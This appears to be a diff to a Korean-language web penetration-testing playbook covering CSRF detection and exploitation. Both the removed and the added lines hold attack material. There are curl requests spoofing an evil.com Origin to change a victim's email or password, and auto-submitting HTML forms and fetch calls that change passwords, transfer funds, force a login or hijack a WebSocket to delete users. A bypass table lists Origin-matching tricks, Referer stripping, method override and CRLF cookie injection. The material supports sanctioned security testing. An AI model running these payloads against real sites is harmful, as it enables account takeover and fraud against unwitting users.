@@ -1,92 +1,133 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**정찰 페이로드:**
 
-**테스트 방법:**
-1. 대상 엔드포인트의 정상 요청을 캡처 (쿠키, 파라미터 확인)
-2. curl로 외부 Origin에서 온 것처럼 요청을 전송:
-   - CSRF 토큰 제거
-   - `Origin` 헤더를 외부 도메인으로 설정
-   - `Referer` 헤더를 외부 도메인으로 설정
-3. 요청이 정상 처리되는지 확인 (200 OK, 상태 변경 발생)
-
-**curl 예시:**
+**SameSite 쿠키 속성 확인:**
 ```
-curl -X POST "https://target.com/api/change-password" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com" \
-  -H "Referer: https://evil.com/attack.html" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "new_password=hacked123"
+curl -v "https://target/auth/login" 2>&1 | grep -i 'set-cookie'
 ```
 
-**SameSite 쿠키 확인:**
+| SameSite | CSRF 가능성 |
+|---|---|
+| `None; Secure` | 가능 (cross-site 자동 첨부) |
+| 미설정 (브라우저 기본 Lax) | GET 상태변경만 |
+| `Lax` | GET 상태변경만 |
+| `Strict` | 불가 |
+
+**CORS 정책 확인 (preflight 비교):**
 ```
-# Set-Cookie 헤더에서 SameSite 속성 확인
-curl -v "https://target.com/auth/login" 2>&1 | grep -i "set-cookie"
-```
-
-| SameSite 값 | CSRF 가능성 |
-|-------------|------------|
-| `SameSite=None; Secure` | CSRF 가능 — 크로스사이트 요청에 쿠키 전송 |
-| SameSite 속성 없음 | 브라우저 기본값(`Lax`) 적용 — GET만 전송, POST는 차단 |
-| `SameSite=Lax` | GET 요청으로 상태 변경하는 엔드포인트만 취약 |
-| `SameSite=Strict` | CSRF 불가 — 쿠키가 크로스사이트에서 전송되지 않음 |
-
-**CSRF 토큰 우회 테스트:**
-```
-# 1. 토큰 제거
-curl -X POST "https://target.com/api/change-email" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com" \
-  -d "email=attacker@evil.com"
-
-# 2. 토큰 빈 문자열
-curl -X POST "https://target.com/api/change-email" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com" \
-  -d "email=attacker@evil.com&csrf_token="
-
-# 3. 다른 사용자의 토큰 (토큰이 세션에 바인딩되지 않은 경우)
-curl -X POST "https://target.com/api/change-email" \
-  -H "Cookie: session=USER_A_SESSION" \
-  -H "Origin: https://evil.com" \
-  -d "email=attacker@evil.com&csrf_token=USER_B_TOKEN"
-
-# 4. HTTP 메서드 변경 (POST → GET, CSRF 체크 우회)
-curl "https://target.com/api/change-email?email=attacker@evil.com" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com"
-
-# 5. Content-Type 변경 (JSON → form, CSRF 미들웨어 우회)
-curl -X POST "https://target.com/api/change-email" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com" \
-  -H "Content-Type: text/plain" \
-  -d '{"email":"attacker@evil.com"}'
+curl -sI -H "Origin: https://evil.com" "https://target/api/<endpoint>" | grep -iE '^access-control-'
+curl -sI -X OPTIONS -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: authorization,content-type" \
+  "https://target/api/<endpoint>" | grep -iE '^access-control-'
 ```
 
-**CORS 사전 요청과 CSRF 관계:**
+**Sec-Fetch 헤더 응답 확인 (모던 브라우저 검증 활용 여부):**
 ```
-# CORS preflight 없이 전송 가능한 조건 확인
-# (simple request: GET/POST/HEAD + 제한된 Content-Type + 커스텀 헤더 없음)
-# JSON API가 Content-Type: application/json을 요구하면 preflight 발생 → CSRF 어려움
-# 단, Content-Type 없이도 요청이 처리되는지 확인:
-curl -X POST "https://target.com/api/change-email" \
-  -H "Cookie: session=USER_SESSION_COOKIE" \
-  -H "Origin: https://evil.com" \
-  -d '{"email":"attacker@evil.com"}'
+curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | grep -i "^< HTTP"
+# 거부되면 Sec-Fetch-Site 검증 활용
 ```
 
-**응답 분석 기준:**
+---
 
-| 응답 유형 | 판단 |
-|-----------|------|
-| 200 OK + 상태 변경 확인 (토큰 없이) | 확인됨 |
-| 200 OK + 상태 변경 확인 (외부 Origin) | 확인됨 |
-| 403 + `CSRF token missing` / `invalid token` | 안전 (CSRF 토큰 검증 동작) |
-| 403 + `invalid origin` / CORS 에러 | 안전 (Origin 검증 동작) |
-| 401 Unauthorized (Bearer 토큰 인증) | 해당 없음 (쿠키 미사용 → CSRF 면역) |
-| 200 OK 이지만 상태 변경 없음 (read-only 동작) | 안전 (상태 변경 API가 아님) |
+**기본 페이로드:**
 
-**검증 기준:**
-- **확인됨**: 동적 테스트로 CSRF 토큰 없이 외부 Origin에서 보낸 요청이 정상 처리되어 상태가 변경된 것을 직접 확인함
+**HTML form (auto-submit, simple request):**
+```html
+<form action="https://target/api/change-password" method="POST" id=f>
+  <input name="new_password" value="hacked123">
+</form>
+<script>document.getElementById('f').submit()</script>
+```
+
+**HTML form (multipart/form-data — preflight 미발생):**
+```html
+<form action="https://target/api/upload" method="POST" enctype="multipart/form-data" id=f>
+  <input name="file" type="file">
+</form>
+<script>document.getElementById('f').submit()</script>
+```
+
+**HTML form (text/plain — preflight 미발생, JSON 파서 통과 시):**
+```html
+<form action="https://target/api/transfer" method="POST" enctype="text/plain" id=f>
+  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
+</form>
+<script>document.getElementById('f').submit()</script>
+```
+
+**AJAX (CORS credentials):**
+```javascript
+fetch('https://target/api/change-email', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+// CORS preflight 응답에 Access-Control-Allow-Credentials: true + Origin 반사면 가능
+```
+
+**GET 상태변경 (SameSite=Lax 통과):**
+```html
+<img src="https://target/api/transfer?to=attacker&amount=1000">
+<a href="https://target/api/delete?id=victim">click</a>
+```
+
+**Login CSRF (공격자 계정으로 강제 로그인):**
+```html
+<form action="https://target/login" method="POST" id=f>
+  <input name="username" value="attacker_account">
+  <input name="password" value="attacker_pw">
+</form>
+<script>document.getElementById('f').submit()</script>
+```
+
+**CSWSH (WebSocket Hijacking):**
+```javascript
+const ws = new WebSocket('wss://target/ws');
+ws.onopen = () => ws.send(JSON.stringify({action:'admin_delete', userId:'victim'}));
+// 외부 origin에서 실행 시 브라우저가 victim 쿠키 자동 첨부
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 |
+|---|---|
+| 토큰 검증만 (Origin/Referer 미검증) | 토큰 추출 후 외부 페이지에서 자동 제출 — 토큰을 응답에서 sniff |
+| Naive double submit (cookie==body 일치만) | 임의 동일 값 cookie+body — cookie 주입 가능(다른 sub-domain XSS, CRLF) 시 |
+| Origin substring/prefix match | `https://example.com.attacker.com`, `https://example.com@attacker.com`, `https://example.com#attacker.com`, `https://attacker.com?Origin=https://example.com` |
+| Referer 단독 검증 | `<meta name="referrer" content="no-referrer">`, `<a rel="noreferrer">`, HTTPS→HTTP downgrade |
+| `SameSite=Lax` + GET 상태변경 | `<a>` 클릭, `<img src>`, `<iframe>` top-level navigation |
+| 토큰 일부 method만 검증 (POST만) | PUT/DELETE/PATCH/HEAD/OPTIONS 시도, `X-HTTP-Method-Override: PUT` + POST, `_method=DELETE` form |
+| `Content-Type: application/json` 강제 (preflight 트리거) | `text/plain` 또는 `application/x-www-form-urlencoded` simple request로 변형 (서버가 JSON 파싱하면 통과) |
+| CORS Origin 화이트리스트 | substring match → `evil-allowed.com` 등록, `null` Origin 허용 (`<iframe sandbox>`) |
+| 토큰 만료/rotation 없음 | 한번 캡처한 토큰 영구 재사용 |
+| 토큰 GET URL 포함 | 외부 링크 클릭 시 Referer로 노출 → 재사용 |
+| Sec-Fetch-Site 검증 | `<meta http-equiv="referrer" content="no-referrer">`로 Sec-Fetch metadata 일부 변형 (브라우저 의존) |
+
+**Cookie 주입 게이트 (다른 취약점 결합):**
+```
+# CRLF로 Set-Cookie 주입
+GET /redirect?url=evil%0d%0aSet-Cookie:csrf_token=ATTACKER_VAL HTTP/1.1
+# Set-Cookie 응답 받은 후 naive double submit 우회 시도
+```
+
+---
+
+**참고사항:**
+
+- 빈출 타깃: 비밀번호 변경, 이메일 변경, 결제, 관리자 권한 변경, 게시글 작성/삭제
+- GraphQL mutation을 GET으로 허용하면 CSRF 직결 (graphql-scanner와 결합)
+- API gateway가 쿠키를 백엔드로 통과시키는 경로는 백엔드 자체 CSRF 방어 누락 빈도 높음
+- 모바일 앱 API는 Bearer 가정이 많아 쿠키 인증 잔존 시 CSRF 노출
+- `Sec-Fetch-Site: cross-site` 헤더는 모던 브라우저 자동 첨부 — 서버 활용하면 강력한 방어
+- WebSocket handshake에 SameSite 미적용되는 구 브라우저 환경 (CSWSH) 별도 점검
+- 멀티 계정 테스트 필수 — 계정 A 토큰 캡처 후 계정 B 세션으로 재사용 시도
+- Login CSRF는 공격자 계정으로 피해자 강제 로그인 → 피해자가 무심코 데이터 입력 → 공격자 계정에 저장 → 공격자가 자기 계정 들어가 데이터 탈취
+- multipart/form-data + text/plain은 preflight 미발생 — JSON API라도 파서가 관대하면 우회
+- CSRF 토큰을 LocalStorage 저장 + 헤더 전송은 XSS 결합 시 무력화 — HttpOnly 쿠키 + 서버 검증 권장
+- DPoP/Sec-Fetch-* 같은 modern 방어가 가장 강력 (브라우저 강제)
+- gateway 단에서 토큰 검증하는 경우 backend 직접 호출 우회 가능 — internal endpoint 점검
